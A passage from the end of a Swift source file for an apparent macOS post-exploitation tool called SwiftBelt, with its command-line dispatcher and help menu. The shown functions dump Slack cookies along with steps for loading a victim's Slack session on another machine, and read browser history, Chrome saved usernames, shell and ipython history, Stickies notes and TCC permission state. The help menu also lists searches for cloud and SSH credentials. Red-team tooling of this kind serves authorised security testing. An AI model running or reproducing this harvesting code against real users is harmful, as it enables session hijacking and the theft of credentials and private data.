                
                if sqlite3_open(dbURL.path, &db) != SQLITE_OK{
                    print("\(red)[-] Could not open the Firefox history database file for user \(username)\(colorend)")
                } else {
                    
                    let queryString = "select datetime(visit_date/1000000,'unixepoch') as time, url FROM moz_places, moz_historyvisits where moz_places.id=moz_historyvisits.place_id order by time;"
                    
                    var queryStatement: OpaquePointer? = nil
                    
                    if sqlite3_prepare_v2(db, queryString, -1, &queryStatement, nil) == SQLITE_OK{
                        
                        while sqlite3_step(queryStatement) == SQLITE_ROW{
                            let col1 = sqlite3_column_text(queryStatement, 0)
                            if col1 != nil{
                                ffoxDate = String(cString: col1!)
                            }
                            
                            let col2 = sqlite3_column_text(queryStatement, 1)
                            if col2 != nil{
                                ffoxURL = String(cString: col2!)
                            }
                                                                
                             print("Date: \(ffoxDate) | URL: \(ffoxURL)")
                            
                        }
                        
                        sqlite3_finalize(queryStatement)
                       
                    }
                    
                    
                }
            }
        }
    }
    else {
        print("\(red)[-] Firefox places.sqlite database not found for user \(username)\(colorend)".data(using: .utf8)!)
    }
    
    print("\(colorend)\(yellow)##########################################\(colorend)")
}

func SlackExtract(){
    var fileMan = FileManager.default
    var uName = NSUserName()
    var nm1 = ""
    var nm2 = ""
    var nm3 = ""
    var nm4 = ""
    
    print("\(colorend)\(yellow)##########################################\(colorend)")

    print("==> Slack Info:")

    if fileMan.fileExists(atPath: "/Users/\(uName)/Library/Application Support/Slack"){
        print("\(green)[+] Slack found on this host!\(colorend)")
        if fileMan.fileExists(atPath: "/Users/\(uName)/Library/Application Support/Slack/storage/slack-downloads"){
            print("\u{001B}[0;33m-->Found slack-downloads file\u{001B}[0;0m")
            print("\u{001B}[0;33m---->Downloads content of interest:\u{001B}[0;0m")
            let dwnURL = URL(fileURLWithPath: "/Users/\(uName)/Library/Application Support/Slack/storage/slack-downloads")
            do {
                let dwnData = try String(contentsOf: dwnURL)
                
                let dwnDataJoined = dwnData.components(separatedBy: ",")
                
                for item in dwnDataJoined{
                    if item.contains("http") {
                        print(item)
                    }
                    if item.contains("/Users/"){
                        print("\u{001B}[0;36m==>\u{001B}[0;0m \(item)")
                    }
                }
                
            } catch {
                print("\(red)[-] Error getting contents of slack-downloads file")
            }
            
            
        }
        
        if fileMan.fileExists(atPath: "/Users/\(uName)/Library/Application Support/Slack/storage/slack-workspaces"){
               print("")
               print("\u{001B}[0;33m-->Found slack-workspaces file\u{001B}[0;0m")
               print("\u{001B}[0;33m---->Workspaces info of interest:\u{001B}[0;0m")
               let wkspURL = URL(fileURLWithPath: "/Users/\(uName)/Library/Application Support/Slack/storage/slack-workspaces")
            do {
                let wkspData = try String(contentsOf: wkspURL)
                
                let wkspJoined = wkspData.components(separatedBy: ",")
                
                for each in wkspJoined{
                    if (each.contains("name") && !(each.contains("_"))){
                        if let index = (each.range(of: "{")?.upperBound){
                            let modified = String(each.suffix(from: index))
                            print(modified)
                        } else {
                            print(each)
                        }
                        
                    }
                    
                    if each.contains("team_name"){
                        print("\u{001B}[0;36m==>\u{001B}[0;0m \(each)")
                    }
                    
                    if each.contains("team_url"){
                        print("\u{001B}[0;36m==>\u{001B}[0;0m \(each)")
                    }
                    
                    if each.contains("unreads"){
                        print("\u{001B}[0;36m==>\u{001B}[0;0m \(each)")
                    }
                }
            } catch {
                print("\(red)[-] Error getting slack-teams content\(colorend)")
            }
               
           }
        
        
        if fileMan.fileExists(atPath: "/Users/\(uName)/Library/Application Support/Slack/Cookies"){
            print("")
            print("\u{001B}[0;33m-->Found Slack Cookies Database\u{001B}[0;0m")
            print("\u{001B}[0;33m---->Cookies found:\u{001B}[0;0m")
            var db : OpaquePointer?
            var dbURL = URL(fileURLWithPath: "/Users/\(uName)/Library/Application Support/Slack/Cookies")
            if sqlite3_open(dbURL.path, &db) != SQLITE_OK{
                print("\(red)[-] Could not open the Slack Cookies database\(colorend)")
            } else {
                print("Format: host_key \u{001B}[0;36m||\u{001B}[0;0m name \u{001B}[0;36m||\u{001B}[0;0m value ")
                let queryString = "select datetime(creation_utc, 'unixepoch') as creation, host_key, name, value from cookies order by creation;"
                var queryStatement: OpaquePointer? = nil
                
                if sqlite3_prepare_v2(db, queryString, -1, &queryStatement, nil) == SQLITE_OK{
                    while sqlite3_step(queryStatement) == SQLITE_ROW{
                        let col1 = sqlite3_column_text(queryStatement, 0)
                        if col1 != nil{
                            nm1 = String(cString: col1!)
                        }
                        
                        let col2 = sqlite3_column_text(queryStatement, 1)
                        if col2 != nil{
                            nm2 = String(cString: col2!)
                        }
                        
                        let col3 = sqlite3_column_text(queryStatement, 2)
                        if col3 != nil{
                            nm3 = String(cString: col3!)
                        }
                        
                        let col4 = sqlite3_column_text(queryStatement, 3)
                        if col4 != nil {
                            nm4 = String(cString:col4!)
                        }
                        
                        print("\(nm2) \u{001B}[0;36m||\u{001B}[0;0m \(nm3) \u{001B}[0;36m||\u{001B}[0;0m \(nm4)")
                }
                    
            }
                else {
                    print("\(red)[-] Cookies database not found\(colorend)")
                }
        }
        
    }
        
        print("\u{001B}[0;36m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\u{001B}[0;0m")
        print("Steps from Cody's article to load the Slack files found:")
        print("1. Install a new instance of slack (but don’t sign in to anything)")
        print("2. Close Slack and replace the automatically created Slack/storage/slack-workspaces and Slack/Cookies files with the two you downloaded from the victim")
        print("3. Start Slack")
        print("\u{001B}[0;36m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\u{001B}[0;0m")
        
       print("\(colorend)\(yellow)##########################################\(colorend)")
    }
}

func ShellHistory(){
    print("\(colorend)\(yellow)##########################################\(colorend)")
    
    let uName = NSUserName()

    let bashHistoryPath = "/Users/\(uName)/.bash_history"
    if fileMan.fileExists(atPath: bashHistoryPath){
        print("==> Bash History Data:\(green)")
        let bashHistory = URL(fileURLWithPath: bashHistoryPath)
        do {
            let bashData = try String(contentsOf: bashHistory)
            print(bashData)
        } catch {
            print("\(colorend)\(red)[-] Error reading bash history content for the current user\(colorend)")
        }
    } else {
        print("\(red)[-] ~/.bash_history file not found on this host\(colorend)")
    }

    let zshHistoryPath = "/Users/\(uName)/.zsh_history"
    if fileMan.fileExists(atPath: zshHistoryPath){
        print("==> Zsh History Data:\(green)")
        let zshHistory = URL(fileURLWithPath: zshHistoryPath)
        do {
            let zshData = try String(contentsOf: zshHistory)
            print(zshData)
        } catch {
            print("\(colorend)\(red)[-] Error reading Zsh history content for the current user\(colorend)")
        }
    } else {
        print("\(red)[-] ~/.zsh_history file not found on this host\(colorend)")
    }

    print("\(colorend)\(yellow)##########################################\(colorend)")
}

func Bookmarks(){
    print("\(colorend)\(yellow)##########################################\(colorend)")
    
    let uName = NSUserName()
    
    //Chrome Bookmarks
    if fileMan.fileExists(atPath: "/Users/\(uName)/Library/Application Support/Google/Chrome/Default/Bookmarks"){
        print("==> Chrome Bookmarks\(green)")
        do {
            let sshotPath = URL(fileURLWithPath: "/Users/\(uName)/Library/Application Support/Google/Chrome/Default/Bookmarks")
            let fileData = try String(contentsOf: sshotPath)
            print(fileData)
            let list = fileData.components(separatedBy: ",")
            for each in list {
                if (each.contains("url") || each.contains("name")) && !(each.contains("\"type\"")){
                    print(each.replacingOccurrences(of: "}", with: ""))
                }
            }
            
        } catch {
            print("\(colorend)\(red)[-] Error reading Chrome bookmarks for user \(uName)\(colorend)")
        }
        print("\(colorend)\(yellow)##########################################\(colorend)")
    }
    
}

func ChromeUsernames(){
    var uName = NSUserName()
    if fileMan.fileExists(atPath: "/Users/\(uName)/Library/Application Support/Google/Chrome/Default/Login Data"){
        print("")
        print("\u{001B}[0;33m-->Found Chrome Login Data sqlite3 db\u{001B}[0;0m")
        print("\u{001B}[0;33m---->Attempting to grab username and url info....:\u{001B}[0;0m")
        var db : OpaquePointer?
        var dbURL = URL(fileURLWithPath: "/Users/\(uName)/Library/Application Support/Google/Chrome/Default/Login Data")
        if sqlite3_open(dbURL.path, &db) != SQLITE_OK{
            print("\(red)[-] Could not open the Chrome Login Data database\(colorend)")
        } else {
            print("Format: origin_domain \u{001B}[0;36m || \u{001B}[0;0m username_value")
            let queryString = "select origin_domain,username_value from stats;"
            var queryStatement: OpaquePointer? = nil
            
            if sqlite3_prepare_v2(db, queryString, -1, &queryStatement, nil) == SQLITE_OK{
                while sqlite3_step(queryStatement) == SQLITE_ROW{
                    let col1 = sqlite3_column_text(queryStatement, 0)
                    if col1 != nil{
                        nm1 = String(cString: col1!)
                    }
                    
                    let col2 = sqlite3_column_text(queryStatement, 1)
                    if col2 != nil{
                        nm2 = String(cString: col2!)
                    }
                    
                    
                    print("\(nm1) \u{001B}[0;36m || \u{001B}[0;0m \(nm2)")
            }
                
        }
            else {
                print("\(red)[-] Error opening Chrome user db...may be locked (in use). If so, you can simply copy the Login Data db file elsewhere and read from it...\(colorend)")
            }
    }
    
}
}

func CheckFDA(){
    print("\(colorend)\(yellow)##########################################\(colorend)")
    var p1 : Int = 0
    print("==> Full Disk Access Check:")
    let queryString = "kMDItemDisplayName = *TCC.db"
    let username = NSUserName()
    if let query = MDQueryCreate(kCFAllocatorDefault, queryString as CFString, nil, nil) {
        MDQueryExecute(query, CFOptionFlags(kMDQuerySynchronous.rawValue))

        for i in 0..<MDQueryGetResultCount(query) {
            if let rawPtr = MDQueryGetResultAtIndex(query, i) {
                let item = Unmanaged<MDItem>.fromOpaque(rawPtr).takeUnretainedValue()
                if let path = MDItemCopyAttribute(item, kMDItemPath) as? String {
                   
                    if path.hasSuffix("/Users/\(username)/Library/Application Support/com.apple.TCC/TCC.db"){
                        p1 = p1 + 1
                        
                    }
                    
                }
            }
        }
        
        if p1 > 0 {
            print("\(green)[+] Your app context HAS ALREADY been given full disk access (mdquery API calls can see the user's TCC database)\(colorend)")
        }
        else {
            print("\(yellow)[-] Your app context HAS NOT been given full disk access yet (mdquery API calls cannot see the user's TCC database)\(colorend)")
        }

    }
    print("\(colorend)\(yellow)##########################################\(colorend)")

}

func UnivAccessAuth(){
    let username = NSUserName()
    print("==> com.apple.universalaccessAuthWarning.plist check: (note: 1=allowed, 2=denied)")
    var pListFormat = PropertyListSerialization.PropertyListFormat.xml
    var pListData : [String: AnyObject] = [:]
    var pListPath : String? = Bundle.main.path(forResource: "data", ofType: "plist")
    
    if fileMan.fileExists(atPath: "/Users/\(username)/Library/Preferences/com.apple.universalaccessAuthWarning.plist"){
        let plistURL = URL(fileURLWithPath: "/Users/\(username)/Library/Preferences/com.apple.universalaccessAuthWarning.plist")
        do {
            let plistXML = try Data(contentsOf: plistURL)
            pListData = try PropertyListSerialization.propertyList(from: plistXML, options: .mutableContainers, format: &pListFormat) as! [String:AnyObject]
            
            for each in pListData{
                print("\(green)\(each)\(colorend)")
            }
        }
        catch let error {
            print("\(red)\(error)")
        }
        
        print("\(colorend)\(yellow)##########################################\(colorend)")
    }
}

func StickieNotes(){
    var canary = 0
    let username = NSUserName()
    var isDir = ObjCBool(true)
    print("==> Checking for Stickie Note contents:")
    if fileMan.fileExists(atPath: "/Users/\(username)/Library/Containers/com.apple.Stickies/Data/Library/Stickies",isDirectory: &isDir){
        do {
            var stickie_files = try fileMan.contentsOfDirectory(atPath: "/Users/\(username)/Library/Containers/com.apple.Stickies/Data/Library/Stickies")
            if stickie_files.count > 1{
                print("\(green) [+] Stickie Files Found!\(colorend)")
                print("Stickie Note Contents:")
                if stickie_files.contains(".SavedStickiesState"){
                    for file in stickie_files{
                        if file.hasSuffix(".rtfd"){
                            canary = canary + 1
                            var dirname = "/Users/\(username)/Library/Containers/com.apple.Stickies/Data/Library/Stickies/\(file)"
                            
                            var dircontents = try fileMan.contentsOfDirectory(atPath: "/Users/\(username)/Library/Containers/com.apple.Stickies/Data/Library/Stickies/\(file)")
                            for k in dircontents{
                                if k.contains("TXT.rtf"){
                                    
                                    var stickiedata = try String(contentsOfFile: "/Users/\(username)/Library/Containers/com.apple.Stickies/Data/Library/Stickies/\(file)/\(k)")
                                    print("\(green)\(stickiedata)\(colorend)")
                                    
                                }
                            }
                        }
                    }
                }
                

                
            }

            
        }
        catch (let error){
            print("[-]\(red)\(error)\(colorend)")
            
        }
        
    }
    if canary == 0 {
        print("\(yellow)[-] No stickie file contents found on this host\(colorend)")
    }
}

func JupyterCheck(){
    let uName = NSUserName()
    var isDir = ObjCBool(true)
    if fileMan.fileExists(atPath: "/Users/\(uName)/.ipython",isDirectory: &isDir){
        do {
            print("\(colorend)==>.ipython Directory Found:\(green)")
            var db : OpaquePointer?
            var dbURL = URL(fileURLWithPath: "/Users/\(uName)/.ipython/profile_default/history.sqlite")
            if sqlite3_open(dbURL.path, &db) != SQLITE_OK{
                print("\(red)[-] Could not open the ipython history.sqlite database\(colorend)")
            } else {
                print("\(colorend)[+] Results of previously executed ipython commands:\(green)")
                let queryString = "select * from history;"
                var queryStatement: OpaquePointer? = nil
                if sqlite3_prepare_v2(db, queryString, -1, &queryStatement, nil) == SQLITE_OK{
                    while sqlite3_step(queryStatement) == SQLITE_ROW{
                        let col1 = sqlite3_column_text(queryStatement, 0)
                        if col1 != nil{
                            nm1 = String(cString: col1!)
                        }
                        let col2 = sqlite3_column_text(queryStatement, 1)
                        if col2 != nil{
                            nm2 = String(cString: col2!)
                        }
                        
                        let col3 = sqlite3_column_text(queryStatement, 2)
                        if col3 != nil{
                            nm3 = String(cString: col3!)
                        }
                        
                        let col4 = sqlite3_column_text(queryStatement, 3)
                        if col4 != nil{
                            nm4 = String(cString: col4!)
                        }
                        
                        print("session: \(nm1)  |  line: \(nm2) | source text: \(nm3) | source_raw text: \(nm4)")
                    }
                    sqlite3_finalize(queryStatement)
                }
            }
            
        }
        catch {
            print("\(red)[-] Error attempting to get contents of ~/.ipython/profile_default/history.sqlite\(colorend)")
        }
        
    } else {
        print("\(red)[-] ~/.ipython/profile_default/history.sqlite not found on this host\(colorend)")
    }
    
}

Banner()

if CommandLine.arguments.count == 1{
    CheckFDA()
    SecCheck()
    SystemInfo()
    SearchCreds()
    Clipboard()
    RunningApps()
    ListUsers()
    LaunchAgents()
    BrowserHistory()
    SlackExtract()
    ShellHistory()
    UnivAccessAuth()
    ChromeUsernames()
    Bookmarks()
    StickieNotes()
    TextEditCheck()
    JupyterCheck()
}
else {
    for argument in CommandLine.arguments{
        if argument.contains("-h"){
            print("Help menu:")
            print("\(yellow)SwiftBelt Options:\(colorend)")
            print("\(cyan)-CheckFDA -->\(colorend) Check to see if Terminal has already been granted full disk access")
            print("\(cyan)-SecurityTools -->\(colorend) Check for the presence of security tools")
            print("\(cyan)-SystemInfo -->\(colorend) Pull back system info (wifi SSID info, open directory node info, internal IPs,  basic system info)")
            print("\(cyan)-LockCheck -->\(colorend) Check if the screen is currently locked using CGSession API calls")
            print("\(cyan)-SearchCreds -->\(colorend) Searches for ssh/aws/azure/gcloud creds")
            print("\(cyan)-Clipboard --> \(colorend)Dump clipboard contents")
            print("\(cyan)-RunningApps --> \(colorend)List all running apps")
            print("\(cyan)-ListUsers --> \(colorend)List local user accounts")
            print("\(cyan)-LaunchAgents --> \(colorend)List launch agents, launch daemons, and configuration profile files")
            print("\(cyan)-BrowserHistory --> \(colorend)Attempt to pull Safari, Firefox, Chrome, and Quarantine history")
            print("\(cyan)-SlackExtract --> \(colorend)Check if Slack is present and if so read cookie, downloads, and workspaces info")
            print("\(cyan)-ShellHistory --> \(colorend)Read bash history content")
            print("\(cyan)-Bookmarks --> \(colorend)Read Chrome bookmarks")
            print("\(cyan)-ChromeUsernames --> \(colorend)Read Chrome url and username data from the Chrome Login Data db")
            print("\(cyan)-UniversalAccessAuth --> \(colorend)Read from universalaccessAuthWarning.plist to see a list of apps that the user has been presented access control dialogs for along with the user's selection (1: allowed, 2: not allowed)")
            print("\(cyan)-StickieNotes --> \(colorend)Reads any open stickie note contents on the host")
            print("\(cyan)-TextEditCheck --> \(colorend)Check for unsaved TextEdit documents and attempt to read file contents")
            print("\(cyan)-JupyterCheck -->\(colorend)Attempt to read from the ipython history db if present")
            print("")
            print("\(yellow)Usage:\(colorend)")
            print("To run all options:  \(binname)")
            print("To specify certain options:  \(binname) [option1] [option2] [option3]...")
            print("")
            exit(0)
        }
        else {
            if argument.contains("-CheckFDA"){
                CheckFDA()
            }
            
            if argument.contains("-SecurityTools"){
                SecCheck()
            }
            
            if argument.contains("-SystemInfo"){
                SystemInfo()
            }
            
            if argument.contains("-LockCheck"){
                LockCheck()
            }
            
            if argument.contains("-SearchCreds"){
                SearchCreds()
            }
            
            if argument.contains("-Clipboard"){
                Clipboard()
            }
            if argument.contains("-RunningApps"){
                RunningApps()
            }
            if argument.contains("-ListUsers"){
                ListUsers()
            }
            if argument.contains("-LaunchAgents"){
                LaunchAgents()
            }
            if argument.contains("-BrowserHistory"){
                BrowserHistory()
            }
            if argument.contains("-SlackExtract"){
                SlackExtract()
            }
            if argument.contains("-ShellHistory"){
                ShellHistory()
            }
            if argument.contains("-UniversalAccessAuth"){
                UnivAccessAuth()
            }
            
            if argument.contains("-Bookmarks"){
                Bookmarks()
            }
            
            if argument.contains("-ChromeUsernames"){
                ChromeUsernames()
            }
            
            if argument.contains("-StickieNotes"){
                StickieNotes()
            }
            
            if argument.contains("-TextEditCheck"){
                TextEditCheck()
            }
            
            if argument.contains("-JupyterCheck"){
                JupyterCheck()
            }
            
            
            
            
        }
        
    }
}
